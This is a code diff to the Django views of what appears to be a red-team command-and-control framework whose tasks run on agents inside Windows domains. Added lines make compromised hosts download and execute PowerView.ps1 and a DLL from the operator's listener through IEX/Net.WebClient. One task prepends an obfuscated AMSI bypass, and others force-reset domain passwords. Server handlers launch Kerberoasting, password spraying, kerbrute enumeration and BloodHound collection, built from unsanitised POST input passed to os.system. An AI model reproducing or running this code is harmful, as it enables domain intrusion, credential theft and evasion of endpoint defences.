@@ -3,10 +3,10 @@ from blog.views import *
 from blog.models import *
 
 current_path= os.path.dirname(os.path.abspath(__file__))
-tools_path = os.path.normpath(current_path+os.sep+os.pardir)+"/Tools&Scripts"
+tools_path = os.path.normpath(current_path+os.sep+os.pardir)+"/ToolsScripts"
 
 
-#### we need to download modules & tools from ../general/ on the windows machine
+#### we need to download modules & tools from ../ToolsScripts/ on the windows machine
 
 
 ###### PowerView.ps1 need to >>>> obfuscation
@@ -30,7 +30,7 @@ def linkedin_users(request):
         linkedin_password = request.POST['linkedin_password']
         result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
         result_path = result_dir+"results"
-        os.system("echo '===============linkedin_users===============\nOutPut in the following path:\n{result_dir}' >> {result_path};python ../general/linkedin2username/linkedin2username.py -c {comp} -u {linkedin_mail} -p {linkedin_password} -o {result_dir}".format(result_path,comp,linkedin_mail,linkedin_password,result_dir))
+        os.system("echo '===============linkedin_users===============\nOutPut in the following path:\n{result_dir}' >> {result_path};python ../ToolsScripts/linkedin2username/linkedin2username.py -c {comp} -u {linkedin_mail} -p {linkedin_password} -o {result_dir}".format(result_path,comp,linkedin_mail,linkedin_password,result_dir))
     else:
         return render(request, 'blog/listeners.html')
 
@@ -236,8 +236,15 @@ def DomainInfo(request):
         current_user = request.user
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
-        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Get-ADDomain===============";Get-ADDomain;echo "++++++++++++++++++`r`n"'
-        
+
+        listenerdata = ListenerForm.objects.order_by("-created_date").get()
+        ip = listenerdata.ip
+        os.system("timeout 15 python -m http.server 8888 --directory {} & ".format(tools_path))
+        agentdata = Agent.objects.filter(name=agent).values()[0]
+        username = agentdata['username']
+        username= username.split("\\")
+        task= '(New-Object Net.WebClient).DownloadFile(\'http://{0}:8888/MAMAD.dll\', \'c:/users/{1}/MAMAD.dll\');import-module c:/users/{1}/MAMAD.dll;echo "++++++++++++++++++`r`n`t`r`n===============Get-ADDomain===============";Get-ADDomain;echo "++++++++++++++++++`r`n"'.format(ip,username[1])
+        #Downfileasync then import Microsoft.ActiveDirectory.Management.dll
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -749,7 +756,8 @@ def sharp(request):
         DomainName = request.POST['DomainName']
         result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
         result_path = result_dir+"results"        
-        os.system("echo '===============SharpHound===============\nOutPut in the following path:\n{result_dir}' >> {result_path};cd {result_dir};bloodhound-python -u '{username}' -p '{password}' -ns {DCip} -d {DomainName} -c all --zip".format(result_dir,result_path,username,password,DCip,DomainName))
+        os.system("echo '===============SharpHound===============\nOutPut in the following path:\n{0}' >> {1};cd {0};bloodhound-python -u '{2}' -p '{3}' -ns {4} -d {5} -c all --zip".format(result_dir,result_path,username,password,DCip,DomainName))
+        return JsonResponse({},status=200)
     else:
         return render(request, 'blog/listeners.html')
 
@@ -833,7 +841,7 @@ def Dsquery(request):
 
 
 
-def TGStickets_GetSPNusers(request):
+def TGStickets_GetSPNusers(request): #####
     if request.method=='POST':
         DCip = request.POST['DCip']
         domain = request.POST['domain']
@@ -850,13 +858,13 @@ def TGStickets_GetSPNusers(request):
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         if username != '':
-            os.system("echo '===============TGS Tickets===============\nOutPut in the following path:\n{result_dir}' >> {result_path};python ../general/GetUserSPNs.py -dc-ip {DCip} {domain}/{username}:{password} -o {result_dir}TGStickets -request".format(result_dir,result_path,username,password,domain,DCip))
+            os.system("echo '===============TGS Tickets===============\nOutPut in the following path:\n{0}' >> {1};python {6}/GetUserSPNs.py -dc-ip {5} {4}/{2}:{3} -o {0}TGStickets -request".format(result_dir,result_path,username,password,domain,DCip,tools_path))
         else:
             if hashes != '':
-                os.system("echo '===============TGS Tickets===============\nOutPut in the following path:\n{result_dir}' >> {result_path};python ../general/GetUserSPNs.py -dc-ip {DCip} {domain} -hashes {hashes} -o {result_dir}TGStickets -request".format(result_dir,result_path,hashes,domain,DCip))
+                os.system("echo '===============TGS Tickets===============\nOutPut in the following path:\n{0}' >> {1};python {5}/GetUserSPNs.py -dc-ip {4} {3} -hashes {2} -o {0}TGStickets -request".format(result_dir,result_path,hashes,domain,DCip,tools_path))
 
             else:
-                os.system("echo '===============TGS Tickets===============\nOutPut in the following path:\n{result_dir}' >> {result_path};python ../general/GetUserSPNs.py -dc-ip {DCip} {domain} -aeskey {aeskey} -o {result_dir}TGStickets -request".format(result_dir,result_path,aeskey, domain,DCip))
+                os.system("echo '===============TGS Tickets===============\nOutPut in the following path:\n{0}' >> {1};python {5}/GetUserSPNs.py -dc-ip {4} {3} -aeskey {2} -o {0}TGStickets -request".format(result_dir,result_path,aeskey, domain,DCip,tools_path))
     
         return JsonResponse({},status=200)
 
@@ -933,7 +941,8 @@ def UserEnumwithKerbrute(request):
         domain = request.POST['domain']
         result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
         result_path = result_dir+"results"
-        os.system("echo '===============kerbrute O/P===============\nOutPut in the following path:\n{result_dir}' >> {result_path};./../general/kerbrute_linux_386 userenum -d {domain} --dc {dc_ip} {users_list} | cut -d ':' -f 4 | sed 's/ //g' >> {result_dir}KerpUserEnum ".format(domain,dc_ip,users_list,result_path))
+        os.system("echo '===============kerbrute O/P===============\nOutPut in the following path:\n{4}' >> {3};{5}/kerbrute/dist/kerblin userenum -d {0} --dc {1} {2}  >> {4}KerpUserEnum ".format(domain,dc_ip,users_list,result_path,result_dir,tools_path))
+        return JsonResponse({},status=200)
     else:
         return render(request, 'blog/listeners.html')
 
@@ -950,7 +959,7 @@ def GPO_windapsearch(request):
         username = request.POST['username']
         password = request.POST['password']
         result_path = current_path+"/../../data/listeners/agents/{}/results".format(agent)
-        os.system("echo '===============GPO_windapsearch===============' >> {result_path};python  ../general/windapsearch/windapsearch.py --dc-ip {ip} -u {username} -p {password} --gpos >> {result_path}  ;".format(DCip,username,password,result_path))
+        os.system("echo '===============GPO_windapsearch===============' >> {result_path};python  ../ToolsScripts/windapsearch/windapsearch.py --dc-ip {ip} -u {username} -p {password} --gpos >> {result_path}  ;".format(DCip,username,password,result_path))
         return JsonResponse({},status=200)
     else:
         return render(request, 'blog/listeners.html')
@@ -975,10 +984,10 @@ def CME_pass_spray(request):
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         DCip = request.POST['DCip']
-        userslist = request.POST['userslist']
+        users_list = request.POST['users_list']
         password = request.POST['password']
         result_path = current_path+"/../../data/listeners/agents/{}/results".format(agent)
-        os.system("echo '===============Password Spraying===============' >> {result_path};crackmapexec smb {DCip} -u {userslist} -p {password} | grep + >> {result_path};".format(DCip,userslist,password,result_path))
+        os.system("echo '===============Password Spraying===============' >> {3};crackmapexec smb {0} -u {1} -p {2} | grep + | sed 's/\x1B[@A-Z\\\]^_]\|\x1B\[[0-9:;<=>?]*[-!\"\#$%&'\"'\"'()*+,.\/]*[][\\@A-Z^_`a-z{{|}}~]//g' >> {3};".format(DCip,users_list,password,result_path))
         return JsonResponse({},status=200)
     else:
         return render(request, 'blog/listeners.html')
@@ -1121,12 +1130,14 @@ def forceChangePass_DomainUserPassword(request):
         current_user = request.user
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
+        listenerdata = ListenerForm.objects.order_by("-created_date").get()
+        ip = listenerdata.ip
         contoleduser = request.POST['contoleduser']
         password = request.POST['password']
         wanteduser = request.POST['wanteduser']
         wantedpassword = request.POST['wantedpassword']
         os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
-        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Force Change Password===============";import-module $env:userprofile\powerview.ps1;$firstPassword =ConvertTo-SecureString \'{password}\' -AsPlainText -Force;$Cred =New-Object System.Management.Automation.PSCredential(\'INLANEFREIGHT\{contoleduser}\',$firstPassword);$secondPassword =ConvertTo-SecureString \'{wantedpassword}\' -AsPlainText -Force;Set-DomainUserPassword -Identity {wanteduser} -AccountPassword $secondPassword -Credential $Cred -Verbose;echo "++++++++++++++++++`r`n"'.format(password,contoleduser,wantedpassword,wanteduser)
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Force Change Password===============";IEX(New-Object Net.WebClient).DownloadString(\'http://{0}:8888/PowerView.ps1\');$firstPassword =ConvertTo-SecureString \'{1}\' -AsPlainText -Force;$Cred =New-Object System.Management.Automation.PSCredential(\'INLANEFREIGHT\{2}\',$firstPassword);$secondPassword =ConvertTo-SecureString \'{3}\' -AsPlainText -Force;Set-DomainUserPassword -Identity {4} -AccountPassword $secondPassword -Credential $Cred -Verbose;echo "++++++++++++++++++`r`n"'.format(ip,password,contoleduser,wantedpassword,wanteduser)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -1202,7 +1213,7 @@ def CreateFake_SPN(request):
         return render(request, 'blog/listeners.html')
 
 
-def UserGeneralInfo(request):
+def UserGeneralInfo(request):####stopped
     if request.method=='POST':
         agent = request.POST['agent']
         agentId = request.POST['agentId']
@@ -1210,16 +1221,19 @@ def UserGeneralInfo(request):
         current_user = request.user
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
+        listenerdata = ListenerForm.objects.order_by("-created_date").get()
+        ip = listenerdata.ip
         user = request.POST['user']
-        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
-        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Createing Fake SPN===============";import-module $env:userprofile\powerview.ps1;Get-DomainUser -Identity {user} ;echo "++++++++++++++++++`r`n"'.format(user)
+        os.system("timeout 30 python3 -m http.server --directory {} 8888 &".format(tools_path))
+        amsi= '$apple=[Ref].Assembly.GetTypes();ForEach($banana in $apple) {if ($banana.Name -like "*siUtils") {$cherry=$banana}};$dogwater=$cherry.GetFields(\'NonPublic,Static\');ForEach($earache in $dogwater) {if ($earache.Name -like "*InitFailed") {$foxhole=$earache}};$foxhole.SetValue($null,$true);'
+        task= 'echo "++++++++++++++++   ++`r`n`t`r`n===============UserINFO===============";{2}IEX(New-Object Net.WebClient).DownloadString(\'http://{0}:8888/PowerView.ps1\');Get-DomainUser -Identity {1} ;echo "++++++++++++++++++`r`n"'.format(ip,user,amsi)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
             f.close()
         return JsonResponse({},status=200)
 
-    else:
+    else:   
         return render(request, 'blog/listeners.html')
 
 
@@ -1248,7 +1262,7 @@ def Enum_GroupMembers_on_machine(request):
         return render(request, 'blog/listeners.html')
 
 
-def LateralMov_RDP(request):
+def LateralMov_RDP(request):   ##username
     if request.method=='POST':
         agent = request.POST['agent']
         agentId = request.POST['agentId']
@@ -1320,7 +1334,7 @@ def LateralMov_InvokeCommand(request):
     else:
         return render(request, 'blog/listeners.html')
 
-def gpp_autologin(request):
+def gpp_autologin(request): ####
     if request.method=='POST':
         agent = request.POST['agent']
         agentId = request.POST['agentId']
